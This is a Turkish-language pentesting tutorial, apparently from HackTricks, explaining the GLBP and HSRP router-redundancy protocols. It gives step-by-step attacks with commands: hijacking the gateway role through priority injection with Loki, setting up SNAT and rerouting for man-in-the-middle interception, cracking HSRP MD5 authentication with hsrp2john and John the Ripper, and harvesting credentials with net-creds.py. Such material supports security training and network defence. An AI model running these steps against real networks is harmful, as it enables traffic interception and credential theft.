# GLBP ve HSRP Saldırıları

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## FHRP Kaçırma Genel Bakışı

### FHRP Hakkında Bilgiler
FHRP, birden fazla yönlendiriciyi tek bir sanal birim haline getirerek ağın sağlamlığını sağlamayı amaçlayan bir protokol grubudur, böylece yük dağıtımı ve hata toleransı artırılır. Cisco Systems, bu pakette GLBP ve HSRP gibi önde gelen protokoller tanıttı.

### GLBP Protokolü Hakkında Bilgiler
Cisco'nun oluşturduğu GLBP, TCP/IP yığınında çalışır ve iletişim için UDP'yi 3222 numaralı portta kullanır. GLBP grubundaki yönlendiriciler, 3 saniyelik aralıklarla "hello" paketleri alışverişi yapar. Bir yönlendirici bu paketleri 10 saniye boyunca göndermezse, çevrimdışı olarak kabul edilir. Bununla birlikte, bu zamanlayıcılar sabit değildir ve değiştirilebilir.

### GLBP İşlemleri ve Yük Dağıtımı
GLBP, tek bir sanal IP ile birleştirilmiş birden fazla sanal MAC adresi kullanarak yönlendiriciler arasında yük dağıtımını sağlayarak öne çıkar. Bir GLBP grubunda, her yönlendirici paket iletimine dahil olur. HSRP/VRRP'nin aksine, GLBP, şu mekanizmalar aracılığıyla gerçek yük dengelemesi sunar:

- **Ana Bilgisayara Bağımlı Yük Dengeleme:** Bir ana bilgisayara sürekli AVF MAC adresi atamasını korur, bu, kararlı NAT yapılandırmaları için önemlidir.
- **Round-Robin Yük Dengeleme:** Varsayılan yaklaşım, talep eden ana bilgisayarlara yönelik AVF MAC adresi atamasını sırayla değiştirir.
- **Ağırlıklı Round-Robin Yük Dengeleme:** Önceden belirlenmiş "Ağırlık" metriklerine dayalı olarak yükü dağıtır.

### GLBP'de Ana Bileşenler ve Terimler
- **AVG (Aktif Sanal Ağ Geçidi):** MAC adreslerini eş yönlendiricilere atamaktan sorumlu ana yönlendirici.
- **AVF (Aktif Sanal Yönlendirici):** Ağ trafiğini yönetmek için belirlenen bir yönlendirici.
- **GLBP Önceliği:** AVG'yi belirleyen bir metrik, varsayılan olarak 100'den başlar ve 1 ile 255 arasında değişir.
- **GLBP Ağırlığı:** Bir yönlendiricideki mevcut yükü yansıtır, manuel olarak veya Nesne İzleme aracılığıyla ayarlanabilir.
- **GLBP Sanal IP Adresi:** Bağlı tüm cihazlar için ağın varsayılan ağ geçidi olarak hizmet verir.

Etkileşimler için GLBP, ayrılmış 224.0.0.102 çoklu yayın adresini ve UDP portunu 3222 kullanır. Yönlendiriciler, 3 saniyelik aralıklarla "hello" paketleri iletimi yapar ve bir paket 10 saniyelik bir süre içinde kaçırılırsa işlevsiz kabul edilir.

### GLBP Saldırı Mekanizması
Bir saldırgan, en yüksek öncelik değerine (255) sahip bir GLBP paketi göndererek ana yönlendirici haline gelebilir. Bu, trafik yakalama veya yönlendirme olanağı sağlayarak DoS veya MITM saldırılarına yol açabilir.

### Loki ile GLBP Saldırısı Gerçekleştirme
[Loki](https://github.com/raizo62/loki_on_kali), öncelik ve ağırlığı 255'e ayarlanmış bir paket enjekte ederek bir GLBP saldırısı gerçekleştirebilir. Saldırı öncesi adımlar, Wireshark gibi araçlar kullanılarak sanal IP adresi, kimlik doğrulama varlığı ve yönlendirici öncelik değerlerini toplamayı içerir.

Saldırı Adımları:
1. Promiskü moduna geçin ve IP yönlendirmeyi etkinleştirin.
2. Hedef yönlendiriciyi tanımlayın ve IP'sini alın.
3. Bir İsteksiz ARP oluşturun.
4. AVG'yi taklit eden kötü amaçlı bir GLBP paketi enjekte edin.
5. Saldırganın ağ arabirimine GLBP sanal IP'sini yansıtan ikincil bir IP adresi atayın.
6. Tam trafik görünürlüğü için SNAT uygulayın.
7. İnternet erişimini orijinal AVG yönlendiricisi üzerinden devam ettirmek için yönlendirmeyi ayarlayın.

Bu adımları takip ederek, saldırgan kendisini ağ trafiğini, şifrelenmemiş veya hassas verileri de içeren bir "orta adam" olarak konumlandırabilir ve analiz edebilir.

Demonstrasyon için gereken komut parçaları aşağıda verilmiştir:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### HSRP Sızma Yöntemi Pasif Açıklaması ve Komut Detayları

#### HSRP (Hot Standby Router/Redundancy Protocol) Genel Bakış
HSRP, ağ geçidi yedekliliği için tasarlanmış Cisco'ya ait bir protokoldür. Birden fazla fiziksel yönlendiriciyi paylaşılan bir IP adresine sahip tek bir mantıksal birim olarak yapılandırmayı sağlar. Bu mantıksal birim, trafiği yönlendirmekten sorumlu olan birincil yönlendirici tarafından yönetilir. GLBP'nin aksine, yük dengelemesi için öncelik ve ağırlık gibi metrikler kullanmaz, HSRP trafiği yönetimi için tek bir etkin yönlendiriciye dayanır.

#### HSRP'de Roller ve Terimler
- **HSRP Etkin Yönlendirici**: Trafik akışını yöneten ağ geçidi olarak hareket eden cihaz.
- **HSRP Bekleme Yönlendirici**: Etkin yönlendirici başarısız olursa devralmaya hazır yedek yönlendirici.
- **HSRP Grubu**: Tek bir dayanıklı sanal yönlendirici oluşturmak için işbirliği yapan yönlendiriciler kümesi.
- **HSRP MAC Adresi**: HSRP yapılandırmasındaki mantıksal yönlendiriciye atanmış sanal MAC adresi.
- **HSRP Sanal IP Adresi**: Bağlı cihazlar için varsayılan ağ geçidi olarak hareket eden HSRP grubunun sanal IP adresi.

#### HSRP Sürümleri
HSRP iki sürümde gelir, HSRPv1 ve HSRPv2, grup kapasitesi, çoklu yayın IP kullanımı ve sanal MAC adres yapısı açısından farklılık gösterir. Protokol, hizmet bilgileri alışverişi için belirli çoklu yayın IP adreslerini kullanır, Hello paketleri her 3 saniyede bir gönderilir. Bir yönlendiriciye 10 saniyelik bir süre içinde paket alınmazsa etkin olmadığı varsayılır.

#### HSRP Saldırı Mekanizması
HSRP saldırıları, Etkin Yönlendirici'nin rolünü zorla alarak maksimum öncelik değeri enjekte etmeyi içerir. Bu, Man-In-The-Middle (MITM) saldırısına yol açabilir. Temel saldırı öncesi adımlar arasında HSRP yapılandırması hakkında veri toplamak yer alır, bu da trafiği analiz etmek için Wireshark kullanılarak yapılabilir.

#### HSRP Kimlik Doğrulamasını Atlayan Adımlar
1. HSRP verilerini içeren ağ trafiğini .pcap dosyası olarak kaydedin.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. .pcap dosyasından MD5 karma değerlerini hsrp2john.py kullanarak çıkarın.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. John the Ripper kullanarak MD5 karma değerlerini kırın.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Loki ile HSRP Enjeksiyonu Gerçekleştirme**

1. HSRP reklamlarını tanımlamak için Loki'yi başlatın.
2. Ağ arayüzünü promiscuous moduna ayarlayın ve IP yönlendirmeyi etkinleştirin.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Loki'yi belirli yönlendiriciyi hedeflemek, kırılmış HSRP şifresini girmek ve Etkin Yönlendiriciyi taklit etmek için gerekli yapılandırmaları yapmak için kullanın.
4. Etkin Yönlendirici rolünü aldıktan sonra, ağ arayüzünü ve IP tablolarını yapılandırarak meşru trafiği engelleyin.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Trafik yönlendirmek için yönlendirme tablosunu değiştirin ve eski Etkin Yönlendirici üzerinden trafiği yönlendirin.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Yakalanan trafiğe ait kimlik bilgilerini almak için net-creds.py veya benzer bir yardımcı programı kullanın.
```shell
sudo python2 net-creds.py -i eth0
```

Bu adımları uygulamak saldırganı, GLBP sızma yöntemi için yapılan işlemlere benzer şekilde trafiği engellemek ve manipüle etmek için bir konuma yerleştirir. Bu, HSRP gibi yedeklilik protokollerindeki zafiyeti ve sağlam güvenlik önlemlerine olan ihtiyacı vurgular.
